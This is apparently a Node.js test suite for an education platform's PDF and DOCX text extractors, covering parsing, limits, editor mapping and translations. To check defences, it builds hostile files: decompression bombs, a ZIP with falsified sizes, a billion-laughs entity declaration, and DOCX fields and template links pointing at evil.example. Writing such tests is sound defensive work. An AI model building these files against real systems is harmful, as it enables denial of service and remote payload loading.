// breinhap#31, without a database: the PDF and DOCX parsers in their bounded thread (text, structure,
// references, warnings; corrupt, encrypted and oversized files; time, memory and cancellation limits),
// the author's mapping onto the editor, and the four languages of the extraction screens.
import assert from "node:assert/strict";
import { test } from "node:test";
import { deflateRawSync, deflateSync } from "node:zlib";

import { EXTRACT_LANGUAGES, extractLocale, XT } from "../src/extract/i18n.mjs";
import { ExtractFailed, LIMITS } from "../src/extract/limits.mjs";
import { refsOf, ROLES, toEditorValues } from "../src/extract/map.mjs";
import { checkPdfBudget } from "../src/extract/pdf-budget.mjs";
import { runParser } from "../src/extract/sandbox.mjs";
import { validateFile } from "../src/uploads/validate.mjs";
import { docxOf, documentXml, encryptedPdf, listItem, para, table, textPdf } from "./extract-fixtures.mjs";
import { CONTENT_TYPES, zip } from "./upload-fixtures.mjs";

const failsWith = async (promise, code) =>
	assert.rejects(promise, (e) => e instanceof ExtractFailed && e.code === code, `expected ${code}`);

// ── PDF ──────────────────────────────────────────────────────────────────────────────────────────

test("PDF: text in reading order, headings by size, paragraphs by gaps, the page of every block", async () => {
	const bytes = textPdf([
		[{ text: "Prikkel en reactie", size: 20 }, "Een prikkel is een verande-", "ring die je waarneemt.", "", "", "Een receptor neemt de prikkel waar."],
		["- Een knal", "- Fel licht"],
	]);
	assert.equal(validateFile({ name: "les.pdf", bytes }).kind, "pdf"); // what reaches extraction passed #29
	const progress = [];
	const { blocks, warnings, units } = await runParser({ kind: "pdf", bytes, onProgress: (d, n) => progress.push([d, n]) });
	assert.equal(units, 2);
	assert.deepEqual(warnings, []);
	assert.deepEqual(blocks, [
		{ type: "heading", text: "Prikkel en reactie", ref: { page: 1 } },
		{ type: "paragraph", text: "Een prikkel is een verandering die je waarneemt.", ref: { page: 1 } },
		{ type: "paragraph", text: "Een receptor neemt de prikkel waar.", ref: { page: 1 } },
		{ type: "list", text: "- Een knal", ref: { page: 2 } },
		{ type: "list", text: "- Fel licht", ref: { page: 2 } },
	]);
	assert.deepEqual(progress.at(-1), [2, 2]);
});

test("PDF: a scan (pages without text) explains that OCR is not available yet", async () => {
	const scan = await runParser({ kind: "pdf", bytes: textPdf([[], []], { image: [0, 1] }) });
	assert.deepEqual(scan.blocks, []);
	assert.deepEqual(scan.warnings, ["ocr_unavailable"]);
	const mixed = await runParser({ kind: "pdf", bytes: textPdf([["Tekst"], []], { image: [1] }) });
	assert.equal(mixed.blocks.length, 1);
	assert.deepEqual(mixed.warnings, ["pages_without_text"]);
	assert.deepEqual(mixed.emptyPages, [2]);
	assert.match(XT.en.warnings.ocr_unavailable, /OCR\) is not available yet/);
});

test("PDF: corrupt and password-protected files fail with their own code", async () => {
	await failsWith(runParser({ kind: "pdf", bytes: Buffer.from("%PDF-1.7\nniet echt een pdf\n%%EOF\n") }), "corrupt");
	await failsWith(runParser({ kind: "pdf", bytes: textPdf([["Hallo"]]).subarray(0, 60) }), "corrupt");
	await failsWith(runParser({ kind: "pdf", bytes: Buffer.from("geen pdf") }), "corrupt");
	await failsWith(runParser({ kind: "pdf", bytes: encryptedPdf() }), "encrypted");
});

test("PDF: more than the page limit is cut off with a warning, never read further", async () => {
	const pages = Array.from({ length: LIMITS.pages + 3 }, (_, i) => [`Pagina ${i + 1}`]);
	const { blocks, warnings, units } = await runParser({ kind: "pdf", bytes: textPdf(pages) });
	assert.equal(units, LIMITS.pages);
	assert.equal(blocks.at(-1).text, `Pagina ${LIMITS.pages}`);
	assert.ok(warnings.includes("truncated_pages"));
});

test("PDF: a compression bomb is refused before pdf.js reads it (decoded data is outside the heap cap)", async () => {
	const stream = (dictionary, data) => `<<${dictionary}/Length ${data.length}>>stream\n${data.toString("latin1")}\nendstream`;
	const bomb = deflateSync(Buffer.alloc(40 * 1024 * 1024, 0x20)); // 40 MB of spaces in ~40 kB
	const withBomb = textPdf([["Hallo"]], { extraObjects: [stream("/Filter/FlateDecode/DecodeParms<</Predictor 1>>", bomb)] });
	assert.ok(withBomb.length < 100_000);
	assert.equal(validateFile({ name: "bom.pdf", bytes: withBomb }).kind, "pdf"); // the upload checks let it through
	await failsWith(runParser({ kind: "pdf", bytes: withBomb }), "too_large");
	// chained filters are measured too; many streams together count against one total
	const chained = Buffer.from(deflateSync(Buffer.alloc(20 * 1024 * 1024)).toString("hex"));
	assert.throws(() => checkPdfBudget(textPdf([["x"]], { extraObjects: [stream("/Filter[/ASCIIHexDecode/FlateDecode]", chained)] })), (e) => e.code === "too_large");
	const piece = deflateSync(Buffer.alloc(10 * 1024 * 1024));
	const many = textPdf([["x"]], { extraObjects: Array.from({ length: 6 }, () => stream("/Filter/FlateDecode", piece)) });
	assert.throws(() => checkPdfBudget(many), (e) => e.code === "too_large");
	assert.ok(checkPdfBudget(many, { perStream: 16 * 1024 * 1024, total: 80 * 1024 * 1024 }) >= 60 * 1024 * 1024);
	// what cannot be measured is not read
	assert.throws(() => checkPdfBudget(textPdf([["x"]], { extraObjects: [stream("/Filter/LZWDecode", Buffer.from("x"))] })), (e) => e.code === "unsupported");
	assert.throws(() => checkPdfBudget(textPdf([["x"]], { extraObjects: [stream("/Filter 9 0 R", Buffer.from("x"))] })), (e) => e.code === "unsupported");
	// images are never decoded for text, so they are not counted
	assert.equal(checkPdfBudget(textPdf([["x"]], { extraObjects: [stream("/Subtype/Image/Filter/DCTDecode", Buffer.alloc(1000))] })) < 1000, true);
	// a normal compressed page still reads
	const ops = Buffer.from("BT /F1 12 Tf 72 700 Td (Gecomprimeerd) Tj ET");
	const compressed = textPdf([["x"]]).toString("latin1").replace(/<<\/Length \d+>>stream\n[^\n]*\nendstream/, stream("/Filter/FlateDecode", deflateSync(ops)));
	assert.equal((await runParser({ kind: "pdf", bytes: Buffer.from(compressed, "latin1") })).blocks[0].text, "Gecomprimeerd");
});

// ── DOCX ─────────────────────────────────────────────────────────────────────────────────────────

test("DOCX: headings, paragraphs, list items and table rows, with their paragraph number", async () => {
	const bytes = docxOf(
		[
			para("Prikkel &amp; reactie", "Kop1"),
			para("Een prikkel is een verandering."),
			listItem("Een knal"),
			table([["Prikkel", "Reactie"], ["Licht", "Knipperen"]]),
			"<w:p/>",
			para("Einde", "Heading2"),
		].join(""),
		[],
		{ deflate: true },
	);
	assert.equal(validateFile({ name: "les.docx", bytes }).kind, "docx");
	const { blocks, warnings } = await runParser({ kind: "docx", bytes });
	assert.deepEqual(warnings, []);
	assert.deepEqual(
		blocks.map((b) => [b.type, b.text, b.ref.paragraph]),
		[
			["heading", "Prikkel & reactie", 1],
			["paragraph", "Een prikkel is een verandering.", 2],
			["list", "Een knal", 3],
			["table", "Prikkel | Reactie", 5],
			["table", "Licht | Knipperen", 7],
			["heading", "Einde", 9],
		],
	);
});

test("DOCX: field instructions, links elsewhere and embedded parts are never followed, and say so", async () => {
	const field =
		'<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> INCLUDETEXT "https://evil.example/x.docx" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>zichtbaar</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>';
	const rels =
		'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org" TargetMode="External"/></Relationships>';
	const template =
		'<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="r9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>';
	const { blocks, warnings } = await runParser({
		kind: "docx",
		bytes: docxOf(`${field}<w:altChunk r:id="r2"/>`, [["word/_rels/document.xml.rels", rels], ["word/_rels/settings.xml.rels", template], ["word/footnotes.xml", "<w:footnotes/>"]]),
	});
	assert.deepEqual(blocks.map((b) => b.text), ["zichtbaar"]);
	assert.deepEqual(warnings.sort(), ["embedded_content_ignored", "external_links_ignored", "fields_ignored", "notes_ignored"]);
});

test("DOCX: only images means OCR is not available; entities, corrupt, encrypted and oversized files are refused", async () => {
	const pictures = docxOf('<w:p><w:r><w:drawing><wp:inline/></w:drawing></w:r></w:p>', [["word/media/image1.png", "x"]]);
	assert.deepEqual((await runParser({ kind: "docx", bytes: pictures })).warnings.sort(), ["images_ignored", "ocr_unavailable"]);
	assert.deepEqual((await runParser({ kind: "docx", bytes: docxOf("") })).warnings, ["no_text"]);
	// an entity declaration (external entities, "billion laughs") is never expanded
	const entity = documentXml(para("&lol;"), '<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY lol "lol">]>');
	await failsWith(runParser({ kind: "docx", bytes: docxOf(entity) }), "unsupported");
	await failsWith(runParser({ kind: "docx", bytes: docxOf(para("x")).subarray(0, 120) }), "corrupt");
	await failsWith(runParser({ kind: "docx", bytes: zip([["[Content_Types].xml", CONTENT_TYPES], ["word/other.xml", "<x/>"]]) }), "corrupt");
	const locked = docxOf(para("geheim"));
	const central = locked.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]));
	locked.writeUInt16LE(1, central + 8); // the "encrypted" flag of the first entry
	await failsWith(runParser({ kind: "docx", bytes: locked }), "encrypted");
	// 20 MB of document.xml in a 20 kB file: never inflated past the limit
	const huge = documentXml(para(" ".repeat(20 * 1024 * 1024)));
	const bomb = docxOf(huge, [], { deflate: true });
	assert.ok(deflateRawSync(huge).length < 100_000);
	await failsWith(runParser({ kind: "docx", bytes: bomb }), "too_large");
	// the same, with sizes that lie: it still stops at the limit
	const liar = docxOf(huge, [], { deflate: true });
	let at = -1;
	while ((at = liar.indexOf(Buffer.from([0x50, 0x4b, 0x01, 0x02]), at + 1)) !== -1) if (liar.subarray(at + 46, at + 46 + 17).toString() === "word/document.xml") liar.writeUInt32LE(1000, at + 24);
	await failsWith(runParser({ kind: "docx", bytes: liar }), "too_large");
});

test("DOCX: a text box keeps the paragraph around it whole, and its text is read once", async () => {
	const box = (text) => `<w:txbxContent>${para(text)}</w:txbxContent>`;
	const xml = `<w:p><w:r><w:t>Voor</w:t></w:r><w:r><mc:AlternateContent><mc:Choice Requires="wps"><w:drawing>${box("In het kader")}</w:drawing></mc:Choice><mc:Fallback><w:pict>${box("In het kader")}</w:pict></mc:Fallback></mc:AlternateContent></w:r><w:r><w:t xml:space="preserve"> en na</w:t></w:r></w:p>${para("Volgende")}`;
	const { blocks } = await runParser({ kind: "docx", bytes: docxOf(xml) });
	assert.deepEqual(blocks.map((b) => b.text), ["Voor en na", "Volgende", "In het kader"]);
});

// ── the bounds ───────────────────────────────────────────────────────────────────────────────────

test("bounds: a parse past its time is stopped; out of memory is reported; a cancel ends the thread", async () => {
	const pdf = textPdf([["Hallo"]]);
	await failsWith(runParser({ kind: "pdf", bytes: pdf, limits: { ...LIMITS, timeoutMs: 1 } }), "timeout");
	await failsWith(runParser({ kind: "pdf", bytes: textPdf(Array.from({ length: 150 }, () => ["x ".repeat(500)])), limits: { ...LIMITS, heapMb: 4, youngMb: 1 } }), "too_complex");
	const controller = new AbortController();
	const running = runParser({ kind: "pdf", bytes: pdf, signal: controller.signal });
	controller.abort();
	await failsWith(running, "cancelled");
	const aborted = new AbortController();
	aborted.abort();
	await failsWith(runParser({ kind: "pdf", bytes: pdf, signal: aborted.signal }), "cancelled");
	await failsWith(runParser({ kind: "png", bytes: pdf }), "unsupported");
	// the thread still works after all of that
	assert.equal((await runParser({ kind: "pdf", bytes: pdf })).blocks[0].text, "Hallo");
});

// ── the author's mapping ─────────────────────────────────────────────────────────────────────────

test("mapping: the chosen pieces fill the editor; no answer is chosen, no minutes, the source keeps its pages", () => {
	const blocks = [
		{ type: "heading", text: "Prikkel en reactie", ref: { page: 1 } },
		{ type: "paragraph", text: "Ik leg prikkel en reactie uit.", ref: { page: 1 } },
		{ type: "paragraph", text: "Een prikkel is een verandering.", ref: { page: 2 } },
		{ type: "paragraph", text: "Een harde knal.", ref: { page: 2 } },
		{ type: "paragraph", text: "Wat is een prikkel?", ref: { page: 3 } },
		{ type: "list", text: "Een spier", ref: { page: 3 } },
		{ type: "list", text: "Een verandering", ref: { page: 3 } },
		{ type: "paragraph", text: "Zet in volgorde.", ref: { page: 5 } },
		{ type: "list", text: "prikkel", ref: { page: 5 } },
		{ type: "list", text: "reactie", ref: { page: 5 } },
		{ type: "paragraph", text: "Niet gebruikt", ref: { page: 6 } },
		{ type: "paragraph", text: "Nog een titel", ref: { page: 6 } },
	];
	const roles = new Map([[0, "title"], [1, "goal"], [2, "learn"], [3, "example"], [4, "practice"], [5, "option"], [6, "option"], [7, "check"], [8, "step"], [9, "step"], [11, "title"]]);
	const { values, notes, used } = toEditorValues(blocks, roles, { fileName: "les.pdf", sourceKind: "publisher", sourceNote: "Biologie voor jou 3" });
	assert.equal(used, 10);
	assert.equal(values.title, "Prikkel en reactie");
	assert.equal(values["missions.0.title"], "Prikkel en reactie");
	assert.equal(values["curriculum.leerdoel"], "Ik leg prikkel en reactie uit.");
	assert.equal(values["missions.0.learn.0.text"], "Een prikkel is een verandering.");
	assert.equal(values["missions.0.learn.0.example"], "Een harde knal.");
	assert.equal(values["missions.0.practice.0.prompt"], "Wat is een prikkel?");
	assert.deepEqual([values["missions.0.practice.0.options.0"], values["missions.0.practice.0.options.1"]], ["Een spier", "Een verandering"]);
	assert.equal(values["missions.0.check.0.kind"], "order");
	assert.deepEqual([values["missions.0.check.0.items.0"], values["missions.0.check.0.items.1"]], ["prikkel", "reactie"]);
	// never invented: a correct answer, the minutes, a code, a review
	assert.ok(!Object.keys(values).some((k) => /answerIndex|minutes|^id$|review/.test(k)));
	assert.equal(values["sources.0.kind"], "book");
	assert.equal(values["sources.0.title"], "Biologie voor jou 3 · les.pdf, p. 1–3, 5");
	assert.deepEqual(notes, [{ code: "title_twice", block: 12 }]);
	// pieces that do not fit are named, not silently placed somewhere
	const odd = toEditorValues(blocks.slice(0, 3), new Map([[0, "option"], [1, "explanation"], [2, "why"]]));
	assert.equal(odd.used, 0);
	assert.deepEqual(odd.notes.map((n) => n.code), ["option_without_question", "explanation_without_question", "why_without_mistake"]);
	assert.equal(refsOf([{ ref: { paragraph: 4 } }, { ref: { paragraph: 5 } }, { ref: { paragraph: 9 } }]), "¶ 4–5, 9");
});

// ── languages ────────────────────────────────────────────────────────────────────────────────────

const shape = (value) =>
	typeof value === "function" ? "fn" : value && typeof value === "object" ? Object.fromEntries(Object.keys(value).sort().map((k) => [k, shape(value[k])])) : typeof value;

test("languages: every text of the extraction screens exists in en, nl, fr and de; the workspace preference and Dutch default apply", () => {
	assert.deepEqual(EXTRACT_LANGUAGES, ["en", "nl", "fr", "de"]);
	for (const lang of ["nl", "fr", "de"]) assert.deepEqual(shape(XT[lang]), shape(XT.en), `${lang} has every key of en`);
	for (const role of ROLES) for (const lang of EXTRACT_LANGUAGES) assert.ok(XT[lang].roles[role], `${lang}: role ${role}`);
	const req = (cookie = "", accept = "") => ({ headers: { cookie, "accept-language": accept } });
	const url = (q = "") => new URL(`https://management.breinhap.com/bibliotheek/uittreksels${q}`);
	assert.equal(extractLocale(req(), url()), "nl");
	assert.equal(extractLocale(req("", "es-ES,es"), url()), "nl");
	assert.equal(extractLocale(req("", "fr-BE,fr;q=0.9"), url()), "fr");
	assert.equal(extractLocale(req("breinhap-lang=nl", "fr"), url()), "nl");
	assert.equal(extractLocale(req("breinhap-lang=nl; asafarim-locale=de-BE", "fr"), url()), "nl");
	assert.equal(extractLocale(req("asafarim-locale=de"), url("?lang=fr")), "fr");
	assert.equal(extractLocale(req("asafarim-locale=xx"), url("?lang=xx")), "nl");
});
